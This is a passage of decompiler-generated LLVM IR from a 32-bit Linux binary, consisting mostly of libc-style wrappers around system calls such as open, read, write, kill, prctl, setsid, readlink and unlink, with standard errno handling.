  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051b21 = load i32, i32* @edi, align 4
  store i32 %v0_8051b21, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8051b39 = load i32, i32* @ebx, align 4
  %v2_8051b41 = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v2_8051b41, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v2_8051b41, -4095
  br i1 %tmp12, label %dec_label_pc_8051b59, label %dec_label_pc_8051b4d

dec_label_pc_8051b4d:                             ; preds = %dec_label_pc_8051b21
  %v1_8051b4d = call i32 @function_8051fb9(i32 %v0_8051b39)
  %v0_8051b52 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051b52 = sub i32 0, %v0_8051b52
  %v2_8051b54 = inttoptr i32 %v1_8051b4d to i32*
  store i32 %v1_8051b52, i32* %v2_8051b54, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8051b5e.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051b59

dec_label_pc_8051b59:                             ; preds = %dec_label_pc_8051b21, %dec_label_pc_8051b4d
  %v2_8051b5e = phi i32 [ %v0_8051b21, %dec_label_pc_8051b21 ], [ %v2_8051b5e.pre, %dec_label_pc_8051b4d ]
  %v0_8051b59 = phi i32 [ %v2_8051b41, %dec_label_pc_8051b21 ], [ -1, %dec_label_pc_8051b4d ]
  store i32 %v2_8051b5e, i32* %edi.global-to-local, align 4
  ret i32 %v0_8051b59

; uselistorder directives
  uselistorder i32 %v2_8051b41, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051b59, { 1, 0 }
}

define i32 @function_8051b60(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051b60:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051b60 = load i32, i32* @ebx, align 4
  store i32 %v0_8051b60, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8051b73 = call i32 @kill(i32 %arg1, i32 %arg2)
  store i32 %v2_8051b73, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_8051b73, -4095
  br i1 %tmp9, label %dec_label_pc_8051b8c, label %dec_label_pc_8051b80

dec_label_pc_8051b80:                             ; preds = %dec_label_pc_8051b60
  %v1_8051b80 = call i32 @function_8051fb9(i32 %v0_8051b60)
  %v0_8051b85 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051b85 = sub i32 0, %v0_8051b85
  %v2_8051b87 = inttoptr i32 %v1_8051b80 to i32*
  store i32 %v1_8051b85, i32* %v2_8051b87, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051b90.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051b8c

dec_label_pc_8051b8c:                             ; preds = %dec_label_pc_8051b60, %dec_label_pc_8051b80
  %v2_8051b90 = phi i32 [ %v0_8051b60, %dec_label_pc_8051b60 ], [ %v2_8051b90.pre, %dec_label_pc_8051b80 ]
  %v0_8051b8c = phi i32 [ %v2_8051b73, %dec_label_pc_8051b60 ], [ -1, %dec_label_pc_8051b80 ]
  %v2_8051b8e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051b8e, i32* @edx, align 4
  store i32 %v2_8051b90, i32* @ebx, align 4
  ret i32 %v0_8051b8c

; uselistorder directives
  uselistorder i32 %v2_8051b73, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051b8c, { 1, 0 }
}

define i32 @function_8051b92(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051b92:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_8051b93 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_8051b99 = sdiv i32 %sext, 16777216
  store i32 %v4_8051b99, i32* @ecx, align 4
  %v4_8051b9d = ptrtoint i8* %arg1 to i32
  %v3_8051ba1 = and i32 %arg2, 64
  %v4_8051ba1 = icmp eq i32 %v3_8051ba1, 0
  br i1 %v4_8051ba1, label %dec_label_pc_8051bb2, label %dec_label_pc_8051ba6

dec_label_pc_8051ba6:                             ; preds = %dec_label_pc_8051b92
  %phitmp = urem i32 %tmp, 65536
  br label %dec_label_pc_8051bb2

dec_label_pc_8051bb2:                             ; preds = %dec_label_pc_8051b92, %dec_label_pc_8051ba6
  %v0_8051bb2 = phi i32 [ 0, %dec_label_pc_8051b92 ], [ %phitmp, %dec_label_pc_8051ba6 ]
  store i32 %v0_8051bb2, i32* @edx, align 4
  store i32 %v4_8051b9d, i32* %ebx.global-to-local, align 4
  %v5_8051bbd = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_8051b99)
  store i32 %v5_8051bbd, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_8051bbd, -4095
  br i1 %tmp15, label %dec_label_pc_8051bd5, label %dec_label_pc_8051bc9

dec_label_pc_8051bc9:                             ; preds = %dec_label_pc_8051bb2
  %v1_8051bc9 = call i32 @function_8051fb9(i32 %v0_8051b93)
  %v0_8051bce = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051bce = sub i32 0, %v0_8051bce
  %v2_8051bd0 = inttoptr i32 %v1_8051bc9 to i32*
  store i32 %v1_8051bce, i32* %v2_8051bd0, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051bd5

dec_label_pc_8051bd5:                             ; preds = %dec_label_pc_8051bb2, %dec_label_pc_8051bc9
  %v0_8051bd5 = phi i32 [ %v5_8051bbd, %dec_label_pc_8051bb2 ], [ -1, %dec_label_pc_8051bc9 ]
  store i32 %v0_8051b93, i32* @ebx, align 4
  ret i32 %v0_8051bd5

; uselistorder directives
  uselistorder i32 %v5_8051bbd, { 1, 0, 2 }
  uselistorder i32 %v4_8051b99, { 1, 0 }
  uselistorder i32 %v0_8051b93, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8051bd5, { 1, 0 }
  uselistorder label %dec_label_pc_8051bb2, { 1, 0 }
}

define i32 @function_8051bdd(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8051bdd:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051bde = load i32, i32* @esi, align 4
  store i32 %v0_8051bde, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8051bf6 = load i32, i32* @ebx, align 4
  %v5_8051bfe = call i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5)
  store i32 %v5_8051bfe, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v5_8051bfe, -4095
  br i1 %tmp12, label %dec_label_pc_8051c16, label %dec_label_pc_8051c0a

dec_label_pc_8051c0a:                             ; preds = %dec_label_pc_8051bdd
  %v1_8051c0a = call i32 @function_8051fb9(i32 %v0_8051bf6)
  %v0_8051c0f = load i32, i32* %esi.global-to-local, align 4
  %v1_8051c0f = sub i32 0, %v0_8051c0f
  %v2_8051c11 = inttoptr i32 %v1_8051c0a to i32*
  store i32 %v1_8051c0f, i32* %v2_8051c11, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8051c19.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8051c16

dec_label_pc_8051c16:                             ; preds = %dec_label_pc_8051bdd, %dec_label_pc_8051c0a
  %v2_8051c19 = phi i32 [ %v0_8051bde, %dec_label_pc_8051bdd ], [ %v2_8051c19.pre, %dec_label_pc_8051c0a ]
  %v0_8051c16 = phi i32 [ %v5_8051bfe, %dec_label_pc_8051bdd ], [ -1, %dec_label_pc_8051c0a ]
  store i32 %v2_8051c19, i32* %esi.global-to-local, align 4
  ret i32 %v0_8051c16

; uselistorder directives
  uselistorder i32 %v5_8051bfe, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051c16, { 1, 0 }
}

define i32 @function_8051c1c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051c1c:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051c1c = load i32, i32* @edi, align 4
  store i32 %v0_8051c1c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8051c2c = load i32, i32* @ebx, align 4
  %v4_8051c34 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_8051c2c, i32* @ebx, align 4
  store i32 %v4_8051c34, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_8051c34, -4095
  br i1 %tmp12, label %dec_label_pc_8051c4c, label %dec_label_pc_8051c40

dec_label_pc_8051c40:                             ; preds = %dec_label_pc_8051c1c
  %v1_8051c40 = call i32 @function_8051fb9(i32 %v0_8051c2c)
  %v0_8051c45 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051c45 = sub i32 0, %v0_8051c45
  %v2_8051c47 = inttoptr i32 %v1_8051c40 to i32*
  store i32 %v1_8051c45, i32* %v2_8051c47, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8051c50.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051c4c

dec_label_pc_8051c4c:                             ; preds = %dec_label_pc_8051c1c, %dec_label_pc_8051c40
  %v2_8051c50 = phi i32 [ %v0_8051c1c, %dec_label_pc_8051c1c ], [ %v2_8051c50.pre, %dec_label_pc_8051c40 ]
  %v0_8051c4c = phi i32 [ %v4_8051c34, %dec_label_pc_8051c1c ], [ -1, %dec_label_pc_8051c40 ]
  store i32 %v2_8051c50, i32* @edi, align 4
  ret i32 %v0_8051c4c

; uselistorder directives
  uselistorder i32 %v4_8051c34, { 1, 0, 2 }
  uselistorder i32 %v0_8051c2c, { 1, 0 }
  uselistorder label %dec_label_pc_8051c4c, { 1, 0 }
}

define i32 @function_8051c52(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051c52:
  %edi.global-to-local = alloca i32, align 4
  %tmp6 = inttoptr i32 %arg2 to i8*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051c52 = load i32, i32* @edi, align 4
  store i32 %v0_8051c52, i32* %stack_var_-4, align 4
  %v4_8051c56 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051c56, i32* %edi.global-to-local, align 4
  %v0_8051c62 = load i32, i32* @ebx, align 4
  %v7_8051c6a = call i32 @readlink(i8* %arg1, i8* %tmp6, i32 %arg3)
  store i32 %v0_8051c62, i32* @ebx, align 4
  store i32 %v7_8051c6a, i32* %edi.global-to-local, align 4
  %tmp14 = icmp ult i32 %v7_8051c6a, -4095
  br i1 %tmp14, label %dec_label_pc_8051c82, label %dec_label_pc_8051c76

dec_label_pc_8051c76:                             ; preds = %dec_label_pc_8051c52
  %v1_8051c76 = call i32 @function_8051fb9(i32 %v0_8051c62)
  %v0_8051c7b = load i32, i32* %edi.global-to-local, align 4
  %v1_8051c7b = sub i32 0, %v0_8051c7b
  %v2_8051c7d = inttoptr i32 %v1_8051c76 to i32*
  store i32 %v1_8051c7b, i32* %v2_8051c7d, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8051c86.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051c82

dec_label_pc_8051c82:                             ; preds = %dec_label_pc_8051c52, %dec_label_pc_8051c76
  %v2_8051c86 = phi i32 [ %v0_8051c52, %dec_label_pc_8051c52 ], [ %v2_8051c86.pre, %dec_label_pc_8051c76 ]
  %v0_8051c82 = phi i32 [ %v7_8051c6a, %dec_label_pc_8051c52 ], [ -1, %dec_label_pc_8051c76 ]
  %v2_8051c84 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051c84, i32* @edx, align 4
  store i32 %v2_8051c86, i32* @edi, align 4
  ret i32 %v0_8051c82

; uselistorder directives
  uselistorder i32 %v7_8051c6a, { 1, 0, 2 }
  uselistorder i32 %v0_8051c62, { 1, 0 }
  uselistorder label %dec_label_pc_8051c82, { 1, 0 }
}

define i32 @function_8051c88() local_unnamed_addr {
dec_label_pc_8051c88:
  %esi.global-to-local = alloca i32, align 4
  %v0_8051ca1 = load i32, i32* @ebx, align 4
  %v1_8051ca9 = call i32 @int80_syscall(i32 142)
  store i32 %v0_8051ca1, i32* @ebx, align 4
  store i32 %v1_8051ca9, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_8051ca9, -4095
  br i1 %tmp12, label %dec_label_pc_8051cc1, label %dec_label_pc_8051cb5

dec_label_pc_8051cb5:                             ; preds = %dec_label_pc_8051c88
  %v1_8051cb5 = call i32 @function_8051fb9(i32 %v0_8051ca1)
  %v0_8051cba = load i32, i32* %esi.global-to-local, align 4
  %v1_8051cba = sub i32 0, %v0_8051cba
  %v2_8051cbc = inttoptr i32 %v1_8051cb5 to i32*
  store i32 %v1_8051cba, i32* %v2_8051cbc, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051cc1

dec_label_pc_8051cc1:                             ; preds = %dec_label_pc_8051c88, %dec_label_pc_8051cb5
  %v0_8051cc1 = phi i32 [ %v1_8051ca9, %dec_label_pc_8051c88 ], [ -1, %dec_label_pc_8051cb5 ]
  ret i32 %v0_8051cc1

; uselistorder directives
  uselistorder i32 %v1_8051ca9, { 1, 0, 2 }
  uselistorder i32 %v0_8051ca1, { 1, 0 }
  uselistorder label %dec_label_pc_8051cc1, { 1, 0 }
}

define i32 @function_8051cc7() local_unnamed_addr {
dec_label_pc_8051cc7:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051cc7 = load i32, i32* @ebx, align 4
  store i32 %v0_8051cc7, i32* %stack_var_-4, align 4
  %v1_8051cd0 = call i32 @setsid(i32 %v0_8051cc7)
  store i32 %v1_8051cd0, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8051cd0, -4095
  br i1 %tmp7, label %dec_label_pc_8051ce7, label %dec_label_pc_8051cdb

dec_label_pc_8051cdb:                             ; preds = %dec_label_pc_8051cc7
  %v1_8051cdb = call i32 @function_8051fb9(i32 %v0_8051cc7)
  %v0_8051ce0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051ce0 = sub i32 0, %v0_8051ce0
  %v2_8051ce2 = inttoptr i32 %v1_8051cdb to i32*
  store i32 %v1_8051ce0, i32* %v2_8051ce2, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051ceb.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051ce7

dec_label_pc_8051ce7:                             ; preds = %dec_label_pc_8051cc7, %dec_label_pc_8051cdb
  %v2_8051ceb = phi i32 [ %v0_8051cc7, %dec_label_pc_8051cc7 ], [ %v2_8051ceb.pre, %dec_label_pc_8051cdb ]
  %v0_8051ce7 = phi i32 [ %v1_8051cd0, %dec_label_pc_8051cc7 ], [ -1, %dec_label_pc_8051cdb ]
  store i32 %v2_8051ceb, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051ce7

; uselistorder directives
  uselistorder i32 %v1_8051cd0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051ce7, { 1, 0 }
}

define i32 @function_8051ced(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051ced:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_8051cee = load i32, i32* @esi, align 4
  %v4_8051cf2 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_8051cf2, i32* @ecx, align 4
  %v2_8051cfe = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_8051cfe, label %dec_label_pc_8051d17, label %dec_label_pc_8051d02

dec_label_pc_8051d02:                             ; preds = %dec_label_pc_8051ced
  %tmp11 = icmp ult i32 %arg1, 3
  br i1 %tmp11, label %dec_label_pc_8051d17, label %dec_label_pc_8051d07

dec_label_pc_8051d07:                             ; preds = %dec_label_pc_8051d02
  %v1_8051d07 = call i32 @function_8051fb9(i32 %v0_8051cee)
  %v1_8051d0c = inttoptr i32 %v1_8051d07 to i32*
  store i32 22, i32* %v1_8051d0c, align 4
  br label %dec_label_pc_8051d3e

dec_label_pc_8051d17:                             ; preds = %dec_label_pc_8051d02, %dec_label_pc_8051ced
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_8051d1c = load i32, i32* @ebx, align 4
  %v7_8051d24 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_8051d1c, i32* @ebx, align 4
  store i32 %v7_8051d24, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v7_8051d24, -4095
  br i1 %tmp12, label %dec_label_pc_8051d3e, label %dec_label_pc_8051d30

dec_label_pc_8051d30:                             ; preds = %dec_label_pc_8051d17
  %v1_8051d30 = call i32 @function_8051fb9(i32 %v0_8051d1c)
  %v0_8051d35 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051d35 = sub i32 0, %v0_8051d35
  %v2_8051d37 = inttoptr i32 %v1_8051d30 to i32*
  store i32 %v1_8051d35, i32* %v2_8051d37, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051d3e

dec_label_pc_8051d3e:                             ; preds = %dec_label_pc_8051d30, %dec_label_pc_8051d17, %dec_label_pc_8051d07
  %storemerge = phi i32 [ -1, %dec_label_pc_8051d07 ], [ %v7_8051d24, %dec_label_pc_8051d17 ], [ -1, %dec_label_pc_8051d30 ]
  %v2_8051d3e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051d3e, i32* @edx, align 4
  store i32 %v0_8051cee, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_8051d24, { 1, 0, 2 }
  uselistorder i32 %v0_8051d1c, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_8051d42(i32* %arg1) local_unnamed_addr {
dec_label_pc_8051d42:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051d42 = load i32, i32* @edi, align 4
  store i32 %v0_8051d42, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_8051d4a = load i32, i32* @ebx, align 4
  %v2_8051d52 = call i32 @time(i32* %arg1)
  store i32 %v0_8051d4a, i32* @ebx, align 4
  store i32 %v2_8051d52, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v2_8051d52, -4095
  br i1 %tmp10, label %dec_label_pc_8051d6a, label %dec_label_pc_8051d5e

dec_label_pc_8051d5e:                             ; preds = %dec_label_pc_8051d42
  %v1_8051d5e = call i32 @function_8051fb9(i32 %v0_8051d4a)
  %v0_8051d63 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051d63 = sub i32 0, %v0_8051d63
  %v2_8051d65 = inttoptr i32 %v1_8051d5e to i32*
  store i32 %v1_8051d63, i32* %v2_8051d65, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8051d6e.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051d6a

dec_label_pc_8051d6a:                             ; preds = %dec_label_pc_8051d42, %dec_label_pc_8051d5e
  %v2_8051d6e = phi i32 [ %v0_8051d42, %dec_label_pc_8051d42 ], [ %v2_8051d6e.pre, %dec_label_pc_8051d5e ]
  %v0_8051d6a = phi i32 [ %v2_8051d52, %dec_label_pc_8051d42 ], [ -1, %dec_label_pc_8051d5e ]
  %v2_8051d6c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051d6c, i32* @edx, align 4
  store i32 %v2_8051d6e, i32* @edi, align 4
  ret i32 %v0_8051d6a

; uselistorder directives
  uselistorder i32 %v2_8051d52, { 1, 0, 2 }
  uselistorder i32 %v0_8051d4a, { 1, 0 }
  uselistorder label %dec_label_pc_8051d6a, { 1, 0 }
}

define i32 @function_8051d70() local_unnamed_addr {
dec_label_pc_8051d70:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8051d70 = load i32, i32* @edi, align 4
  store i32 %v0_8051d70, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v0_8051d78 = load i32, i32* @ebx, align 4
  %v1_8051d79 = inttoptr i32 %tmp to i8*
  %v3_8051d80 = call i32 @unlink(i8* %v1_8051d79)
  store i32 %v0_8051d78, i32* @ebx, align 4
  store i32 %v3_8051d80, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_8051d80, -4095
  br i1 %tmp9, label %dec_label_pc_8051d98, label %dec_label_pc_8051d8c

dec_label_pc_8051d8c:                             ; preds = %dec_label_pc_8051d70
  %v1_8051d8c = call i32 @function_8051fb9(i32 %v0_8051d78)
  %v0_8051d91 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051d91 = sub i32 0, %v0_8051d91
  %v2_8051d93 = inttoptr i32 %v1_8051d8c to i32*
  store i32 %v1_8051d91, i32* %v2_8051d93, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8051d9c.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051d98

dec_label_pc_8051d98:                             ; preds = %dec_label_pc_8051d70, %dec_label_pc_8051d8c
  %v2_8051d9c = phi i32 [ %v0_8051d70, %dec_label_pc_8051d70 ], [ %v2_8051d9c.pre, %dec_label_pc_8051d8c ]
  %v0_8051d98 = phi i32 [ %v3_8051d80, %dec_label_pc_8051d70 ], [ -1, %dec_label_pc_8051d8c ]
  store i32 %v2_8051d9c, i32* @edi, align 4
  ret i32 %v0_8051d98

; uselistorder directives
  uselistorder i32 %v3_8051d80, { 1, 0, 2 }
  uselistorder i32 %v0_8051d78, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_8051d98, { 1, 0 }
}

define i32 @function_8051d9e(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051d9e:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051d9e = load i32, i32* @edi, align 4
  store i32 %v0_8051d9e, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8051dae = load i32, i32* @ebx, align 4
  %v4_8051db6 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_8051db6, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_8051db6, -4095
  br i1 %tmp12, label %dec_label_pc_8051dce, label %dec_label_pc_8051dc2

dec_label_pc_8051dc2:                             ; preds = %dec_label_pc_8051d9e
  %v1_8051dc2 = call i32 @function_8051fb9(i32 %v0_8051dae)
  %v0_8051dc7 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051dc7 = sub i32 0, %v0_8051dc7
  %v2_8051dc9 = inttoptr i32 %v1_8051dc2 to i32*
  store i32 %v1_8051dc7, i32* %v2_8051dc9, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8051dd2.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051dce

dec_label_pc_8051dce:                             ; preds = %dec_label_pc_8051d9e, %dec_label_pc_8051dc2
  %v2_8051dd2 = phi i32 [ %v0_8051d9e, %dec_label_pc_8051d9e ], [ %v2_8051dd2.pre, %dec_label_pc_8051dc2 ]
  %v0_8051dce = phi i32 [ %v4_8051db6, %dec_label_pc_8051d9e ], [ -1, %dec_label_pc_8051dc2 ]
  store i32 %v2_8051dd2, i32* %edi.global-to-local, align 4
  ret i32 %v0_8051dce

; uselistorder directives
  uselistorder i32 %v4_8051db6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051dce, { 1, 0 }
}

define i32 @function_8051dd4() local_unnamed_addr {
dec_label_pc_8051dd4:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-28 = alloca i32, align 4
  %v0_8051dd4 = load i32, i32* @edi, align 4
  %v0_8051dd5 = load i32, i32* @esi, align 4
  %v0_8051dd6 = load i32, i32* @ebx, align 4
  %v12_8051dd7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %tmp, i32* @edi, align 4
  %v1_8051dde = inttoptr i32 %tmp to i32*
  %v2_8051dde = load i32, i32* %v1_8051dde, align 4
  %v12_8051dde = icmp eq i32 %v2_8051dde, -1
  %v1_8051de1 = icmp eq i1 %v12_8051dde, false
  br i1 %v1_8051de1, label %dec_label_pc_8051df3, label %dec_label_pc_8051de3

dec_label_pc_8051de3:                             ; preds = %dec_label_pc_8051dd4
  %v1_8051de3 = call i32 @function_8051fb9(i32 %v0_8051dd6)
  %v1_8051de8 = inttoptr i32 %v1_8051de3 to i32*
  store i32 9, i32* %v1_8051de8, align 4
  br label %dec_label_pc_8051e3d

dec_label_pc_8051df3:                             ; preds = %dec_label_pc_8051dd4
  %v1_8051df3 = add i32 %tmp, 24
  store i32 %v12_8051dd7, i32* @esi, align 4
  %v2_8051e02 = call i32 @function_8053940(i32 %v12_8051dd7, i32 134560061)
  %v1_8051e0a = call i32 @function_805393d(i32 %v1_8051df3)
  store i32 %v1_8051e0a, i32* @eax, align 4
  %v0_8051e0f = load i32, i32* @edi, align 4
  %v1_8051e0f = inttoptr i32 %v0_8051e0f to i32*
  %v2_8051e0f = load i32, i32* %v1_8051e0f, align 4
  store i32 %v2_8051e0f, i32* @ebx, align 4
  store i32 -1, i32* %v1_8051e0f, align 4
  %v2_8051e1c = call i32 @function_8053940(i32 %v12_8051dd7, i32 1)
  %v0_8051e22 = load i32, i32* @edi, align 4
  %v1_8051e22 = add i32 %v0_8051e22, 12
  %v2_8051e22 = inttoptr i32 %v1_8051e22 to i32*
  %v3_8051e22 = load i32, i32* %v2_8051e22, align 4
  %v1_8051e25 = call i32 @function_80531d9(i32 %v3_8051e22)
  %v0_8051e2a = load i32, i32* @edi, align 4
  %v1_8051e2d = call i32 @function_80531d9(i32 %v0_8051e2a)
  %v0_8051e32 = load i32, i32* @ebx, align 4
  %v1_8051e35 = call i32 @function_8051a81(i32 %v0_8051e32)
  br label %dec_label_pc_8051e3d

dec_label_pc_8051e3d:                             ; preds = %dec_label_pc_8051de3, %dec_label_pc_8051df3
  %v0_8051e43 = phi i32 [ -1, %dec_label_pc_8051de3 ], [ %v1_8051e35, %dec_label_pc_8051df3 ]
  store i32 %v0_8051dd6, i32* @ebx, align 4
  store i32 %v0_8051dd5, i32* @esi, align 4
  store i32 %v0_8051dd4, i32* @edi, align 4
  ret i32 %v0_8051e43

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8051e3d, { 1, 0 }
}

define i32 @function_8051e44(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051e44:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8051e44 = load i32, i32* @edi, align 4
  %v0_8051e46 = load i32, i32* @ebx, align 4
  store i32 %v0_8051e46, i32* %stack_var_-12, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-124, align 4
  %v2_8051e55 = inttoptr i32 %arg1 to i8*
  %v3_8051e55 = call i32 @function_8051b92(i8* %v2_8051e55, i32 67584)
  store i32 %v3_8051e55, i32* %eax.global-to-local, align 4
  store i32 %v3_8051e55, i32* @edi, align 4
  %v2_8051e5f = icmp slt i32 %v3_8051e55, 0
  br i1 %v2_8051e5f, label %dec_label_pc_8051f2c, label %dec_label_pc_8051e67

dec_label_pc_8051e67:                             ; preds = %dec_label_pc_8051e44
  %v0_8051e67 = load i32, i32* @ebx, align 4
  %v2_8051e69 = ptrtoint i32* %stack_var_-100 to i32
  store i32 %v2_8051e69, i32* %eax.global-to-local, align 4
  store i32 %v3_8051e55, i32* %stack_var_-124, align 4
  %v4_8051e6f = call i32 @function_8053d3a(i32 %v3_8051e55, i32 %v2_8051e69, i32 %v0_8051e67, i32 %v0_8051e67)
  store i32 %v4_8051e6f, i32* %eax.global-to-local, align 4
  %v2_8051e77 = icmp slt i32 %v4_8051e6f, 0
  br i1 %v2_8051e77, label %dec_label_pc_8051e8d, label %dec_label_pc_8051e7b

dec_label_pc_8051e7b:                             ; preds = %dec_label_pc_8051e67
  %v0_8051e80 = load i32, i32* @edi, align 4
  store i32 %v0_8051e80, i32* %stack_var_-124, align 4
  %v3_8051e81 = call i32 @function_80519bd(i32 %v0_8051e80, i32 2, i32 1)
  store i32 %v3_8051e81, i32* %eax.global-to-local, align 4
  %v2_8051e89 = icmp slt i32 %v3_8051e81, 0
  %v1_8051e8b = icmp eq i1 %v2_8051e89, false
